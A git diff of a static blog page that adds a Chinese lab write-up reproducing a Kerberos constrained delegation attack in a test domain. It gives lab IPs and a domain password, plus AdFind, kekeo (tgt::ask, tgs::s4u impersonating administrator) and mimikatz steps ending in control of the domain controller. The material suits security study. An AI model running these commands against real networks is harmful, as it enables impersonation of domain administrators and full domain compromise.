@@ -6,7 +6,7 @@
 
 <title>内网 | cherry cheeks</title>
 
-<link rel="shortcut icon" href="https://cherry-cheeks.github.io/favicon.ico?v=1635054806698">
+<link rel="shortcut icon" href="https://cherry-cheeks.github.io/favicon.ico?v=1637229825466">
 
 <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cherry-cheeks.github.io/styles/main.css">
@@ -81,7 +81,7 @@
             
         </div>
         <div style="text-align: center">
-            <form id="gridea-search-form" style="position: relative" data-update="1635054806698" action="/search/index.html">
+            <form id="gridea-search-form" style="position: relative" data-update="1637229825466" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                 <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
             </form>
@@ -102,11 +102,46 @@
                     <div>
                         
                         <a href="https://cherry-cheeks.github.io/post/1/">
-                            <span class="post-title gt-c-content-color-first">1</span>
+                            <span class="post-title gt-c-content-color-first">约束委派攻击-基于服务用户复现</span>
                         </a>
                     </div>
                     <div class="gt-post-content post-abstract gt-c-content-color-second">
-                        
+                        <p>准备环境：<br>
+1、windows server 2012 r2	ip：192.168.179.213	域管：administrator	机器名：dc（域控）<br>
+2、windows 7专业版	ip：192.168.179.130	用户名：win7	机器名：win7(域成员机)<br>
+3、域用户weipai	密码：2000816Liu!<br>
+4、域：zhou.com</p>
+<p>准备工作：<br>
+1、因为委派对象只能是机器账户和服务账户，所以我们要将域用户weipai，通过spn注册成服务账户<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229608890.png" alt="" loading="lazy"><br>
+2、将服务账户weipai设置成约束委派<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229635574.png" alt="" loading="lazy"></p>
+<p>工具：<br>
+kekeo、mimikatz、AdFind</p>
+<p>复现过程：<br>
+一、我们得先用AdFind找到设置了约束委派的用户：<br>
+AdFind.exe -b &quot;DC=zhou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229670555.png" alt="" loading="lazy"><br>
+得到信息：<br>
+1、设置约束委派的服务账户有weipai这一个<br>
+2、只能访问指定模拟域用户访问dc（域控）机器上面的cifs服务<br>
+正好我们有weipai这个服务账户的密码，我们可以通过约束委派攻击拿下域控</p>
+<p>二、通过keKeo这个工具向KDC发起请求，得道weipai这个服务账户的TGT<br>
+tgt::ask /user:weipai /password:2000816Liu! /domain:zhou.com /ticket:weipai.kirbi<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229716951.png" alt="" loading="lazy"></p>
+<p>三、利用weipai这个服务账户的TGT申请域控cifs服务的TGS票据<br>
+tgs::s4u /tgt:TGT_weipai@ZHOU.COM_krbtgt~zhou.com@ZHOU.COM.kirbi /user:administrator@zhou.com /service:cifs/dc.zhou.com<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229753468.png" alt="" loading="lazy"></p>
+<p>四、用mimikatz导入TGS票据<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229781166.png" alt="" loading="lazy"></p>
+<p>总结：<br>
+1、找到域内存在约束委派的用户，并查看是否可以访问域控的服务<br>
+2、拿下存在非约束委派的用户，并用kekeo来制作TGT<br>
+3、用kekeo配合上一步制作的TGT来制作访问域控的TGS<br>
+4、mimikatz导入上一步制作的TGS，拿下域控</p>
+<p>参考：https://www.freebuf.com/articles/system/198381.html<br>
+https://xz.aliyun.com/t/10061#toc-6</p>
+
                     </div>
                     <div class="post-info">
                         <time class="post-time gt-c-content-color-first">
